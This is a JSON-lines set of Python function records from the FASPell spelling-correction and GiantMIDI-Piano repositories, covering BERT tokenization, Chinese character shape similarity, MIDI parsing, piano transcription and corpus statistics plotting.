{"docstring": "\"\"\"Adds whitespace around any CJK character.\"\"\"\n", "func_signal": "def _tokenize_chinese_chars(self, text):\n", "code": "output = []\nfor char in text:\n  cp = ord(char)\n  if self._is_chinese_char(cp):\n    output.append(\" \")\n    output.append(char)\n    output.append(\" \")\n  else:\n    output.append(char)\nreturn \"\".join(output)", "path": "FASPell/bert_modified/tokenization.py", "commit_date": "2019-10-10 00:00:00", "repo_name": "iqiyi/FASPell", "stars": 1179, "license": "gpl-3.0", "language": "python", "size": 268}
{"docstring": "\"\"\"\n>>> c = CharFuncs('data/char_meta.txt')\n>>> c.shape_distance('\u7530', '\u7531')\n1\n>>> c.shape_distance('\u725b', '\u5348')\n1\n\"\"\"\n", "func_signal": "def shape_distance(self, char1, char2, safe=True, as_tree=False):\n", "code": "assert char1 in self.data\nassert char2 in self.data\n\ndef safe_encode(decomp):\n    tree = ''\n    for c in string_to_tree(decomp):\n        if c not in self.safe:\n            tree += c\n        else:\n            tree += self.safe[c]\n    return tree\n\ndef safe_encode_string(decomp):\n    tree = ''\n    for c in decomp:\n        if c not in self.safe:\n            tree += c\n        else:\n            tree += self.safe[c]\n    return tree\n\ndecomps_1 = self.data[char1][\"decompositions\"]\ndecomps_2 = self.data[char2][\"decompositions\"]\n\ndistance = 1e5\nif as_tree:\n    for decomp1 in decomps_1:\n        for decomp2 in decomps_2:\n            if not safe:\n                ted = tree_edit_distance(string_to_tree(decomp1), string_to_tree(decomp2))\n            else:\n                ted = tree_edit_distance(safe_encode(decomp1), safe_encode(decomp2))\n                distance = min(distance, ted)\nelse:\n    for decomp1 in decomps_1:\n        for decomp2 in decomps_2:\n            if not safe:\n                ed = edit_distance(decomp1, decomp2)\n            else:\n                ed = edit_distance(safe_encode_string(decomp1), safe_encode_string(decomp2))\n            distance = min(distance, ed)\n\nreturn distance", "path": "FASPell/char_sim.py", "commit_date": "2019-10-10 00:00:00", "repo_name": "iqiyi/FASPell", "stars": 1179, "license": "gpl-3.0", "language": "python", "size": 268}
{"docstring": "\"\"\"Checks whether `chars` is a punctuation character.\"\"\"\n", "func_signal": "def _is_punctuation(char):\n", "code": "cp = ord(char)\n# We treat all non-letter/number ASCII as punctuation.\n# Characters such as \"^\", \"$\", and \"`\" are not in the Unicode\n# Punctuation class but we treat them as punctuation anyways, for\n# consistency.\nif ((cp >= 33 and cp <= 47) or (cp >= 58 and cp <= 64) or\n    (cp >= 91 and cp <= 96) or (cp >= 123 and cp <= 126)):\n  return True\ncat = unicodedata.category(char)\nif cat.startswith(\"P\"):\n  return True\nreturn False", "path": "FASPell/bert_modified/tokenization.py", "commit_date": "2019-10-10 00:00:00", "repo_name": "iqiyi/FASPell", "stars": 1179, "license": "gpl-3.0", "language": "python", "size": 268}
{"docstring": "\"\"\"Tokenizes a piece of text into its word pieces.\n\nThis uses a greedy longest-match-first algorithm to perform tokenization\nusing the given vocabulary.\n\nFor example:\n  input = \"unaffable\"\n  output = [\"un\", \"##aff\", \"##able\"]\n\nArgs:\n  text: A single token or whitespace separated tokens. This should have\n    already been passed through `BasicTokenizer.\n\nReturns:\n  A list of wordpiece tokens.\n\"\"\"\n\n", "func_signal": "def tokenize(self, text):\n", "code": "text = convert_to_unicode(text)\n\noutput_tokens = []\nfor token in whitespace_tokenize(text):\n  chars = list(token)\n  if len(chars) > self.max_input_chars_per_word:\n    output_tokens.append(self.unk_token)\n    continue\n\n  is_bad = False\n  start = 0\n  sub_tokens = []\n  while start < len(chars):\n    end = len(chars)\n    cur_substr = None\n    while start < end:\n      substr = \"\".join(chars[start:end])\n      if start > 0:\n        substr = \"##\" + substr\n      if substr in self.vocab:\n        cur_substr = substr\n        break\n      end -= 1\n    if cur_substr is None:\n      is_bad = True\n      break\n    sub_tokens.append(cur_substr)\n    start = end\n\n  if is_bad:\n    output_tokens.append(self.unk_token)\n  else:\n    output_tokens.extend(sub_tokens)\nreturn output_tokens", "path": "FASPell/bert_modified/tokenization.py", "commit_date": "2019-10-10 00:00:00", "repo_name": "iqiyi/FASPell", "stars": 1179, "license": "gpl-3.0", "language": "python", "size": 268}
{"docstring": "\"\"\"Checks whether `chars` is a control character.\"\"\"\n# These are technically control characters but we count them as whitespace\n# characters.\n", "func_signal": "def _is_control(char):\n", "code": "if char == \"\\t\" or char == \"\\n\" or char == \"\\r\":\n  return False\ncat = unicodedata.category(char)\nif cat.startswith(\"C\"):\n  return True\nreturn False", "path": "FASPell/bert_modified/tokenization.py", "commit_date": "2019-10-10 00:00:00", "repo_name": "iqiyi/FASPell", "stars": 1179, "license": "gpl-3.0", "language": "python", "size": 268}
{"docstring": "\"\"\"\n>>> c = CharFuncs('data/char_meta.txt')\n>>> c.shape_similarity('\u725b', '\u5348')\n0.8571428571428572\n>>> c.shape_similarity('\u7530', '\u7531')\n0.8888888888888888\n\"\"\"\n", "func_signal": "def shape_similarity(self, char1, char2, safe=True, as_tree=False):\n", "code": "assert char1 in self.data\nassert char2 in self.data\n\ndef safe_encode(decomp):\n    tree = ''\n    for c in string_to_tree(decomp):\n        if c not in self.safe:\n            tree += c\n        else:\n            tree += self.safe[c]\n    return tree\n\ndef safe_encode_string(decomp):\n    tree = ''\n    for c in decomp:\n        if c not in self.safe:\n            tree += c\n        else:\n            tree += self.safe[c]\n    return tree\n\ndecomps_1 = self.data[char1][\"decompositions\"]\ndecomps_2 = self.data[char2][\"decompositions\"]\n\nsimilarity = 0.0\nif as_tree:\n    for decomp1 in decomps_1:\n        for decomp2 in decomps_2:\n            if not safe:\n                ted = tree_edit_distance(string_to_tree(decomp1), string_to_tree(decomp2))\n            else:\n                ted = tree_edit_distance(safe_encode(decomp1), safe_encode(decomp2))\n            normalized_ted = 2 * ted / (len(decomp1) + len(decomp2) + ted)\n            similarity = max(similarity, 1 - normalized_ted)\nelse:\n    for decomp1 in decomps_1:\n        for decomp2 in decomps_2:\n            if not safe:\n                ed = edit_distance(decomp1, decomp2)\n            else:\n                ed = edit_distance(safe_encode_string(decomp1), safe_encode_string(decomp2))\n            normalized_ed = ed / max(len(decomp1), len(decomp2))\n            similarity = max(similarity, 1 - normalized_ed)\n\nreturn similarity", "path": "FASPell/char_sim.py", "commit_date": "2019-10-10 00:00:00", "repo_name": "iqiyi/FASPell", "stars": 1179, "license": "gpl-3.0", "language": "python", "size": 268}
{"docstring": "\"\"\"Performs invalid character removal and whitespace cleanup on text.\"\"\"\n", "func_signal": "def _clean_text(self, text):\n", "code": "output = []\nfor char in text:\n  cp = ord(char)\n  if cp == 0 or cp == 0xfffd or _is_control(char):\n    continue\n  if _is_whitespace(char):\n    output.append(\" \")\n  else:\n    output.append(char)\nreturn \"\".join(output)", "path": "FASPell/bert_modified/tokenization.py", "commit_date": "2019-10-10 00:00:00", "repo_name": "iqiyi/FASPell", "stars": 1179, "license": "gpl-3.0", "language": "python", "size": 268}
{"docstring": "\"\"\"Runs basic whitespace cleaning and splitting on a peice of text.\"\"\"\n", "func_signal": "def whitespace_tokenize(text):\n", "code": "text = text.strip()\nif not text:\n  return []\ntokens = text.split()\nreturn tokens", "path": "FASPell/bert_modified/tokenization.py", "commit_date": "2019-10-10 00:00:00", "repo_name": "iqiyi/FASPell", "stars": 1179, "license": "gpl-3.0", "language": "python", "size": 268}
{"docstring": "\"\"\"Converts `text` to Unicode (if it's not already), assuming utf-8 input.\"\"\"\n", "func_signal": "def convert_to_unicode(text):\n", "code": "if six.PY3:\n  if isinstance(text, str):\n    return text\n  elif isinstance(text, bytes):\n    return text.decode(\"utf-8\", \"ignore\")\n  else:\n    raise ValueError(\"Unsupported string type: %s\" % (type(text)))\nelif six.PY2:\n  if isinstance(text, str):\n    return text.decode(\"utf-8\", \"ignore\")\n  elif isinstance(text, unicode):\n    return text\n  else:\n    raise ValueError(\"Unsupported string type: %s\" % (type(text)))\nelse:\n  raise ValueError(\"Not running on Python2 or Python 3?\")", "path": "FASPell/bert_modified/tokenization.py", "commit_date": "2019-10-10 00:00:00", "repo_name": "iqiyi/FASPell", "stars": 1179, "license": "gpl-3.0", "language": "python", "size": 268}
{"docstring": "\"\"\"Get the number of works of composers.\n\nArgs:\n  meta_dict, dict, keys: ['surname', 'firstname', 'music', 'nationality', \n      'birth', 'death', 'youtube_title', 'youtube_id', 'similarity', \n      'piano_solo_prob', 'audio_name']\n  indexes: 1darray, e.g., [0, 2, 5, 6, ...]\n  composers: list\n\nReturns:\n  number_of_works: (composers_num,)\n  sorted_indexes: (composers_num,)\n\"\"\"\n# Composers\n", "func_signal": "def _get_composer_works_num(meta_dict, indexes, composers):\n", "code": "full_names = []\n\n# Number of works\nworks_dict = {composer: 0 for composer in composers}\n\nfor idx in indexes:\n    composer = '{}, {}'.format(meta_dict['surname'][idx], meta_dict['firstname'][idx])\n    if composer in composers:\n        works_dict[composer] += 1\n\nnumber_of_works = np.array([works_dict[composer] for composer in composers])\n\n# Sort by number of works\nsorted_indexes = np.argsort(number_of_works)[::-1]\n\nreturn number_of_works, sorted_indexes", "path": "GiantMIDI-Piano/calculate_statistics.py", "commit_date": "2020-09-18 00:00:00", "repo_name": "bytedance/GiantMIDI-Piano", "stars": 1577, "license": "None", "language": "python", "size": 23124}
{"docstring": "\"\"\"Histogram to frequency.\"\"\"\n", "func_signal": "def _normalize_list(input_list):\n", "code": "total = np.sum([e[1] for e in input_list])\noutput_list = []\nfor e in input_list:\n    output_list.append((e[0], e[1] / total))\nreturn output_list", "path": "GiantMIDI-Piano/calculate_statistics.py", "commit_date": "2020-09-18 00:00:00", "repo_name": "bytedance/GiantMIDI-Piano", "stars": 1577, "license": "None", "language": "python", "size": 23124}
{"docstring": "\"\"\"Calculate statistics of number of music pieces, nationalities, birth, \netc.\"\"\"\n\n# Arugments & parameters\n", "func_signal": "def meta_info(args):\n", "code": "workspace = args.workspace\n\n# Paths\ncsv_path = os.path.join(workspace, 'full_music_pieces_youtube_similarity_pianosoloprob.csv')\nstatistics_path = os.path.join(workspace, 'statistics.pkl')\nos.makedirs(os.path.dirname(statistics_path), exist_ok=True)\n\nmeta_dict = read_csv_to_meta_dict(csv_path)\n\"\"\"keys: ['surname', 'firstname', 'music', 'nationality', 'birth', 'death', \n'youtube_title', 'youtube_id', 'similarity', 'piano_solo_prob', 'audio_name']\"\"\"\n\nfor key in meta_dict.keys():\n    meta_dict[key] = np.array(meta_dict[key])\n\n# Filter piano solo\nindexes = np.where(meta_dict['piano_solo_prob'].astype(np.float32) >= 0.5)[0]\nprint('Music pieces num: {}'.format(len(indexes)))\n\n# Composers\nfull_names = []\n\nfor idx in indexes:\n    full_names.append('{}, {}'.format(meta_dict['surname'][idx], meta_dict['firstname'][idx]))\n\ncomposers = np.array(list(set(full_names)))\nprint('Composers num: {}'.format(len(composers)))\n\n# Number of works\nworks_dict = {composer: {'audio_names': [], 'nationality': None, \n    'birth': None, 'death': None} for composer in composers}\n\nfor idx in indexes:\n    composer = '{}, {}'.format(meta_dict['surname'][idx], meta_dict['firstname'][idx])\n    works_dict[composer]['audio_names'].append(meta_dict['audio_name'][idx])\n    works_dict[composer]['nationality'] = meta_dict['nationality'][idx]\n    works_dict[composer]['birth'] = meta_dict['birth'][idx]\n    works_dict[composer]['death'] = meta_dict['death'][idx]\n\nnumber_of_works = np.array([len(works_dict[composer]['audio_names']) for composer in composers])\nstatistics_dict = {'composers': composers, 'number_of_piano_works': number_of_works}\n\n# Sort by number of works\nsorted_idx = np.argsort(number_of_works)[::-1]\nsorted_list = []\n\nfor idx in sorted_idx:\n    composer = composers[idx]\n    sorted_list.append([composer, len(works_dict[composer]['audio_names']), \n        works_dict[composer]['nationality'], works_dict[composer]['birth'], \n        works_dict[composer]['death']])\n\"\"\"E.g., [..., ['Schmitt, Florent', 132, 'French', '1870', '1958'], ...]\"\"\"\n\n# Count by nationalities\nnationalities = [e[2] for e in sorted_list]\nunique_nationalities = list(set(nationalities))\nnationalities_count = []\nfor na in unique_nationalities:\n    nationalities_count.append(nationalities.count(na))\n\n_idxes = np.argsort(nationalities_count)[::-1]\nunique_nationalities = np.array(unique_nationalities)[_idxes]\nnationalities_count = np.array(nationalities_count)[_idxes]\nprint('-------- Nationalities --------')\nprint('Nationalities:', unique_nationalities)\nprint('Count:', nationalities_count)\n\n# Plot nationalities\nfig_path = 'results/nationalities.pdf'\nN = len(nationalities_count)\nfig, ax = plt.subplots(1, 1, figsize=(8, 4))\nax.set_xlim(-1, N - 1)\nax.set_ylim(0, 200)\nax.set_xlabel('Nationalities', fontsize=14)\nax.set_ylabel('Number of composers', fontsize=14)\nax.bar(np.arange(N - 1), nationalities_count[1 : N], align='center', color='C0', alpha=1)\nax.xaxis.set_ticks(np.arange(N - 1))\nax.xaxis.set_ticklabels(unique_nationalities[1 : N], rotation=90, fontsize=12)\nax.yaxis.grid(color='k', linestyle='--', linewidth=0.3)  # only horizontal grid\nplt.tight_layout()\nplt.savefig(fig_path)\nprint('Save fig to {}'.format(fig_path))\n\n# Year\nbirths = [int(e[3]) // 100 for e in sorted_list  if e[3] != 'unknown']\nunique_births = list(set(births))\nbirths_count = []\nfor na in unique_births:\n    births_count.append(births.count(na))\n\n_idxes = np.argsort(births_count)[::-1]\nunique_births = np.array(unique_births)[_idxes]\nbirths_count = np.array(births_count)[_idxes]\nprint('-------- Birth centery --------')\nprint('Birth centuries:', unique_births)\nprint('Count:', births_count)\n\n# Lifespan\nlifespan = [int(e[4]) - int(e[3]) for e in sorted_list  if e[3] != 'unknown']\nunique_lifespan = list(set(lifespan))\nlifespan_count = []\nfor na in unique_lifespan:\n    lifespan_count.append(lifespan.count(na))\n\n_idxes = np.argsort(unique_lifespan)\nunique_lifespan = np.array(unique_lifespan)[_idxes]\nlifespan_count = np.array(lifespan_count)[_idxes]\nprint('-------- Lifespan --------')\nprint('Life span (years):', unique_lifespan)\nprint('Count:', lifespan_count)\n\n# Dump statistics to disk\npickle.dump(statistics_dict, open(statistics_path, 'wb'))\nprint('Save to {}'.format(statistics_path))", "path": "GiantMIDI-Piano/calculate_statistics.py", "commit_date": "2020-09-18 00:00:00", "repo_name": "bytedance/GiantMIDI-Piano", "stars": 1577, "license": "None", "language": "python", "size": 23124}
{"docstring": "\"\"\"Piano solo detector.\"\"\"\n", "func_signal": "def __init__(self):\n", "code": "self.model = PianoDetection()\n\nif torch.cuda.is_available():\n    self.model = self.model.cuda()\n\nself.model.load('resources/piano_solo_model_32k.pth')", "path": "GiantMIDI-Piano/piano_detection_model.py", "commit_date": "2020-09-18 00:00:00", "repo_name": "bytedance/GiantMIDI-Piano", "stars": 1577, "license": "None", "language": "python", "size": 23124}
{"docstring": "\"\"\"Plot box plot of aligned results.\n\"\"\"\n\n# Paths\n", "func_signal": "def plot_box_plot(args):\n", "code": "csv_path = 'midis_for_evaluation/groundtruth_maestro_giantmidi-piano.csv'\nfig_path = 'results/transcribed_metrics_box_plot.pdf'\nos.makedirs(os.path.dirname(fig_path), exist_ok=True)\n\nwith open(csv_path, 'r') as fr:\n    reader = csv.reader(fr, delimiter='\\t')\n    lines = list(reader)\nlines = lines[1:]\n\npiece_names = []\nmaestro_stats = []\ngiantmidi_stats = []\n\n# Collect statistics\nfor n, line in enumerate(lines):\n    [piece_name, gt_name, maestro_name, giantmidi_name] = line\n    piece_names.append(piece_name)\n\n    print('------ {}, {} ------'.format(n, piece_name))\n    print('Maestro:')\n    csv_path = 'aligned_results/{}_corresp.txt'.format(maestro_name[: -4])\n    maestro_stats.append(get_stats(csv_path))\n\n    print('GiantMIDI-Piano:')\n    csv_path = 'aligned_results/{}_corresp.txt'.format(giantmidi_name[: -4])\n    giantmidi_stats.append(get_stats(csv_path))\n\n# Plot\nfig, axs = plt.subplots(1,3, figsize=(12, 4))\nmetrics_num = 4     # S, D, I, ER\n\n# Plot box plot of Maestro and GiantMIDI-Piano metrics\nfor i, stats in enumerate([maestro_stats, giantmidi_stats]):\n    metrics_mat = []    # (pieces_num, 4)\n    for key in ['S', 'D', 'I']:\n        metrics_mat.append([e[key] / e['N'] for e in stats])\n    metrics_mat.append([e['ER'] for e in stats])\n    metrics_mat = np.array(metrics_mat).T\n    \n    axs[i].set_ylim(0, 0.3)\n    axs[i].boxplot(metrics_mat)\n    axs[i].xaxis.set_ticks(np.arange(0, 5))\n    axs[i].xaxis.set_ticklabels(['', 'S', 'D', 'I', 'ER'])\n\n    for j in range(metrics_num):\n        y = metrics_mat[:, j]\n        x = np.random.normal(j + 1, 0.04, size=len(y))\n        axs[i].plot(x, y, 'r.', alpha=0.2)\n\n    if i == 0:\n        maestro_metrics_mat = metrics_mat\n    elif i == 1:\n        giantmidi_metrics_mat = metrics_mat\n\n# Plot relative difference\nrelative_diff = giantmidi_metrics_mat - maestro_metrics_mat\naxs[2].set_ylim(0., 0.3)\naxs[2].boxplot(relative_diff)\naxs[2].xaxis.set_ticks(np.arange(0, 5))\naxs[2].xaxis.set_ticklabels(['', 'S', 'D', 'I', 'ER'])\n\nfor j in range(metrics_num):\n    y = relative_diff[:, j]\n    x = np.random.normal(j + 1, 0.04, size=len(y))\n    axs[2].plot(x, y, 'r.', alpha=0.2)\n\naxs[0].set_title('Maestro')\naxs[1].set_title('GiantMIDI-Piano')\naxs[2].set_title('Relative difference')\n\nplt.tight_layout()\nplt.savefig(fig_path)\nprint('Save to {}'.format(fig_path))\n\nprint('------ GiantMIDI-Piano sorted ERs ------')\ners = giantmidi_metrics_mat[:, 3]\n# ers = maestro_metrics_mat[:, 3]\nsorted_indexes = np.argsort(ers)\nfor n in range(len(sorted_indexes)):\n    print('{}, ER: {:.3f}'.format(np.array(piece_names)[sorted_indexes[n]], \n        np.array(ers)[sorted_indexes[n]]))\n\nimport crash\nasdf", "path": "GiantMIDI-Piano/evaluate_transcribed_midis.py", "commit_date": "2020-09-18 00:00:00", "repo_name": "bytedance/GiantMIDI-Piano", "stars": 1577, "license": "None", "language": "python", "size": 23124}
{"docstring": "# Arugments & parameters\n", "func_signal": "def plot_note_histogram(args):\n", "code": "    workspace = args.workspace\n\n    # Paths\n    all_music_events_path = os.path.join(workspace, 'all_music_events.pkl')\n    fig_path = 'results/note_histogram.pdf'\n    os.makedirs(os.path.dirname(fig_path), exist_ok=True)\n\n    # Load events\n    all_music_events = pickle.load(open(all_music_events_path, 'rb'))\n    print('Load finish.')\n\n    all_names = sorted([name for name in all_music_events.keys()])\n    all_piano_notes = []\n\n    for name in all_names:\n        note_events = all_music_events[name]['note_events']\n        piano_notes = [note_event['midi_note'] - begin_note for note_event in note_events]\n        all_piano_notes += piano_notes\n\n    counts = count_notes(all_piano_notes)\n\n    fig, ax = plt.subplots(1, 1, figsize=(20, 3))\n    ax.bar(np.arange(classes_num), counts, align='center')\n    ax.xaxis.set_ticks(np.arange(classes_num))\n    ax.xaxis.set_ticklabels(note_names, fontsize=10)\n    ax.yaxis.set_ticks([0, 2e5, 4e5, 6e5, 8e5, 1e6, 1.2e6])\n    ax.yaxis.set_ticklabels(['0', '200,000', '400,000', '600,000', '800,000', \n        '1,000,000', '1,200,000'], fontsize=10)\n    ax.set_xlim(-1, classes_num)\n    ax.set_ylabel('Number of notes', fontsize=15)\n    plt.tight_layout()\n    plt.savefig(fig_path)\n    print('Save to {}'.format(fig_path))\n\n    print('Total notes: {}'.format(counts))", "path": "GiantMIDI-Piano/calculate_statistics.py", "commit_date": "2020-09-18 00:00:00", "repo_name": "bytedance/GiantMIDI-Piano", "stars": 1577, "license": "None", "language": "python", "size": 23124}
{"docstring": "\"\"\"Count chords. If multiple notes are within 50 ms, then we call them\na chord. The chord is transposed so that its bass note is C. Then, \nall notes are moved to a same octave.\n\nArgs:\n  note_events: list, e.g., [\n    {'midi_note': 77, 'onset_time': 177.96, 'offset_time': 180.29, 'velocity': 103},\n    {'midi_note': 29, 'onset_time': 178.64, 'offset_time': 180.34, 'velocity': 87},\n    ...]\n\nReturns:\n  chord_dict, dict, e.g., \n    {'{0}': 5872, '{0, 7}': 386, '{0, 2, 4, 5, 9, 10}': 2, '{0, 3}': 777, ...}\n\"\"\"\n", "func_signal": "def _count_chord(note_events):\n", "code": "chord_dict = {}\nanchor_time = 0\nchord = [0]\ndelta_time = 0.05\n\nfor n in range(len(note_events) - 10):\n    event_time = note_events[n]['onset_time']\n    piano_note = note_events[n]['midi_note'] - 21\n\n    if event_time - anchor_time > delta_time:\n        \"\"\"Collect chord\"\"\"\n        tmp = np.array(chord)\n        tmp -= np.min(tmp)  # Transpose the chord so that its bass note is C\n        tmp %= 12   # Move all notes to a same octave\n        tmp = str(set(sorted(tmp)))\n        if tmp in chord_dict.keys():\n            chord_dict[tmp] += 1\n        else:\n            chord_dict[tmp] = 1\n\n        anchor_time = event_time\n        chord = [piano_note]\n    else:\n        \"\"\"Append notes to a chord\"\"\"\n        chord.append(piano_note)\n\nreturn chord_dict", "path": "GiantMIDI-Piano/calculate_statistics.py", "commit_date": "2020-09-18 00:00:00", "repo_name": "bytedance/GiantMIDI-Piano", "stars": 1577, "license": "None", "language": "python", "size": 23124}
{"docstring": "\"\"\"Transcribe piano solo mp3s to midi files.\n\"\"\"\n\n# Arguments & parameters\n", "func_signal": "def transcribe_piano(args):\n", "code": "workspace = args.workspace\nmp3s_dir = args.mp3s_dir\nmidis_dir = args.midis_dir\nbegin_index = args.begin_index\nend_index = args.end_index\nmini_data = args.mini_data\ndevice = 'cuda' if torch.cuda.is_available() else 'cpu'\n\nif mini_data:\n    prefix = 'minidata_'\nelse:\n    prefix = ''\n\n# Paths\ncsv_path = os.path.join(workspace, \n    '{}full_music_pieces_youtube_similarity_pianosoloprob.csv'.format(prefix))\n\nos.makedirs(midis_dir, exist_ok=True)\n\n# Meta info\nmeta_dict = read_csv_to_meta_dict(csv_path)\n\n# Transcriptor\ntranscriptor = piano_transcription_inference.PianoTranscription(device=device)\n\ncount = 0\ntranscribe_time = time.time()\naudios_num = len(meta_dict['surname'])\n\nfor n in range(begin_index, min(end_index, audios_num)):\n    if float(meta_dict['piano_solo_prob'][n]) >= 0.5:\n        count += 1\n        \n        mp3_path = os.path.join(mp3s_dir, '{}.mp3'.format(meta_dict['audio_name'][n]))\n        print(n, mp3_path)\n        midi_path = os.path.join(midis_dir, '{}.mid'.format(meta_dict['audio_name'][n]))\n\n        (audio, _) = piano_transcription_inference.load_audio(mp3_path, \n            sr=piano_transcription_inference.sample_rate, mono=True)\n\n        try:\n            # Transcribe\n            transcribed_dict = transcriptor.transcribe(audio, midi_path)\n        except:\n            print('Failed for this audio!') \n\nprint('Time: {:.3f} s'.format(time.time() - transcribe_time))", "path": "GiantMIDI-Piano/audios_to_midis.py", "commit_date": "2020-09-19 00:00:00", "repo_name": "bytedance/GiantMIDI-Piano", "stars": 1577, "license": "None", "language": "python", "size": 23124}
{"docstring": "\"\"\"Get regression target. See Fig. 2 of [1] for an example.\n[1] Q. Kong, et al., High resolution piano transcription by \n    regressing onset and offset time stamps, 2020.\n\ninput:\n  input: (frames_num,)\n\nReturns: (frames_num,), e.g., [0, 0, 0.1, 0.3, 0.5, 0.7, 0.9, 0.9, 0.7, 0.5, 0.3, 0.1, 0, 0, ...]\n\"\"\"\n", "func_signal": "def get_regression(self, input):\n", "code": "step = 1. / self.frames_per_second\noutput = np.ones_like(input)\n\nlocts = np.where(input < 0.5)[0] \nif len(locts) > 0:\n    for t in range(0, locts[0]):\n        output[t] = step * (t - locts[0]) - input[locts[0]]\n\n    for i in range(0, len(locts) - 1):\n        for t in range(locts[i], (locts[i] + locts[i + 1]) // 2):\n            output[t] = step * (t - locts[i]) - input[locts[i]]\n\n        for t in range((locts[i] + locts[i + 1]) // 2, locts[i + 1]):\n            output[t] = step * (t - locts[i + 1]) - input[locts[i]]\n\n    for t in range(locts[-1], len(input)):\n        output[t] = step * (t - locts[-1]) - input[locts[-1]]\n\noutput = np.clip(np.abs(output), 0., 0.05) * 20\noutput = (1. - output)\n\nreturn output", "path": "GiantMIDI-Piano/utilities.py", "commit_date": "2020-09-18 00:00:00", "repo_name": "bytedance/GiantMIDI-Piano", "stars": 1577, "license": "None", "language": "python", "size": 23124}
{"docstring": "\"\"\"\ninput:  mono shape=(n,) or stereo shape=(n,2)\noutput: mag, ang\n        mono shape=(1,F,T) or stereo shape=(2,F,T)\n\"\"\"\n\n", "func_signal": "def wav2spec(wav):\n", "code": "if wav.ndim == 1:\n    \n    mag, ang = wav2spec_mono(wav)\n    \nelse:\n    \n    mag1, ang1 = wav2spec_mono(wav[:, 0])\n    mag2, ang2 = wav2spec_mono(wav[:, 1])\n    mag = np.concatenate((mag1, mag2), axis=0)\n    ang = np.concatenate((ang1, ang2), axis=0)\n\nreturn mag, ang", "path": "GiantMIDI-Piano/piano_detection_model.py", "commit_date": "2020-09-18 00:00:00", "repo_name": "bytedance/GiantMIDI-Piano", "stars": 1577, "license": "None", "language": "python", "size": 23124}
{"docstring": "\"\"\"Get the number of works of composers.\n\nArgs:\n  meta_dict, dict, keys: ['surname', 'firstname', 'music', 'nationality', \n      'birth', 'death', 'youtube_title', 'youtube_id', 'similarity', \n      'piano_solo_prob', 'audio_name', 'audio_duration']\n  indexes: 1darray, e.g., [0, 2, 5, 6, ...]\n  composers: list\n\nReturns:\n  durations: (composers_num,)\n  sorted_indexes: (composers_num,)\n\"\"\"\n# Composers\n", "func_signal": "def _get_composer_durations(meta_dict, indexes, composers):\n", "code": "full_names = []\n\n# Number of works\ndurations_dict = {composer: 0 for composer in composers}\n\nfor idx in indexes:\n    composer = '{}, {}'.format(meta_dict['surname'][idx], meta_dict['firstname'][idx])\n    if composer in composers:\n        durations_dict[composer] += float(meta_dict['audio_duration'][idx]) / 3600\n\ndurations = np.array([durations_dict[composer] for composer in composers])\n\n# Sort by number of works\nsorted_indexes = np.argsort(durations)[::-1]\n\nreturn durations, sorted_indexes", "path": "GiantMIDI-Piano/calculate_statistics.py", "commit_date": "2020-09-18 00:00:00", "repo_name": "bytedance/GiantMIDI-Piano", "stars": 1577, "license": "None", "language": "python", "size": 23124}
{"docstring": "\"\"\"Parse MIDI file.\n\nArgs:\n  midi_path: str\n\nReturns:\n  midi_dict: dict, e.g. {\n    'midi_event': [\n        'program_change channel=0 program=0 time=0', \n        'control_change channel=0 control=64 value=127 time=0', \n        'control_change channel=0 control=64 value=63 time=236', \n        ...],\n    'midi_event_time': [0., 0, 0.98307292, ...]}\n\"\"\"\n\n", "func_signal": "def read_midi(midi_path):\n", "code": "midi_file = MidiFile(midi_path)\nticks_per_beat = midi_file.ticks_per_beat\n\nassert len(midi_file.tracks) == 2\n\"\"\"The first track contains tempo, time signature. The second track \ncontains piano events.\"\"\"\n\nmicroseconds_per_beat = midi_file.tracks[0][0].tempo\nbeats_per_second = 1e6 / microseconds_per_beat\nticks_per_second = ticks_per_beat * beats_per_second\n\nmessage_list = []\n\nticks = 0\ntime_in_second = []\n\nfor message in midi_file.tracks[1]:\n    message_list.append(str(message))\n    ticks += message.time\n    time_in_second.append(ticks / ticks_per_second)\n\nmidi_dict = {\n    'midi_event': np.array(message_list), \n    'midi_event_time': np.array(time_in_second)}\n\nreturn midi_dict", "path": "GiantMIDI-Piano/utilities.py", "commit_date": "2020-09-18 00:00:00", "repo_name": "bytedance/GiantMIDI-Piano", "stars": 1577, "license": "None", "language": "python", "size": 23124}
{"docstring": "\"\"\"Update the offset of all notes until pedal is released.\n\nArgs:\n  note_events: list of dict, e.g., [\n    {'midi_note': 51, 'onset_time': 696.63544, 'offset_time': 696.9948, 'velocity': 44}, \n    {'midi_note': 58, 'onset_time': 696.99585, 'offset_time': 697.18646, 'velocity': 50}\n    ...]\n  pedal_events: list of dict, e.g., [\n    {'onset_time': 696.46875, 'offset_time': 696.62604}, \n    {'onset_time': 696.8063, 'offset_time': 698.50836}, \n    ...]\n\nReturns:\n  ex_note_events: list of dict, e.g., [\n    {'midi_note': 51, 'onset_time': 696.63544, 'offset_time': 696.9948, 'velocity': 44}, \n    {'midi_note': 58, 'onset_time': 696.99585, 'offset_time': 697.18646, 'velocity': 50}\n    ...]\n\"\"\"\n", "func_signal": "def extend_pedal(self, note_events, pedal_events):\n", "code": "note_events = collections.deque(note_events)\npedal_events = collections.deque(pedal_events)\nex_note_events = []\n\nidx = 0     # Index of note events\nwhile pedal_events: # Go through all pedal events\n    pedal_event = pedal_events.popleft()\n    buffer_dict = {}    # keys: midi notes, value for each key: event index\n\n    while note_events:\n        note_event = note_events.popleft()\n\n        # If a note offset is between the onset and offset of a pedal, \n        # Then set the note offset to when the pedal is released.\n        if pedal_event['onset_time'] < note_event['offset_time'] < pedal_event['offset_time']:\n            \n            midi_note = note_event['midi_note']\n\n            if midi_note in buffer_dict.keys():\n                \"\"\"Multiple same note inside a pedal\"\"\"\n                _idx = buffer_dict[midi_note]\n                del buffer_dict[midi_note]\n                ex_note_events[_idx]['offset_time'] = note_event['onset_time']\n\n            # Set note offset to pedal offset\n            note_event['offset_time'] = pedal_event['offset_time']\n            buffer_dict[midi_note] = idx\n        \n        ex_note_events.append(note_event)\n        idx += 1\n\n        # Break loop and pop next pedal\n        if note_event['offset_time'] > pedal_event['offset_time']:\n            break\n\nwhile note_events:\n    \"\"\"Append left notes\"\"\"\n    ex_note_events.append(note_events.popleft())\n\nreturn ex_note_events", "path": "GiantMIDI-Piano/utilities.py", "commit_date": "2020-09-18 00:00:00", "repo_name": "bytedance/GiantMIDI-Piano", "stars": 1577, "license": "None", "language": "python", "size": 23124}
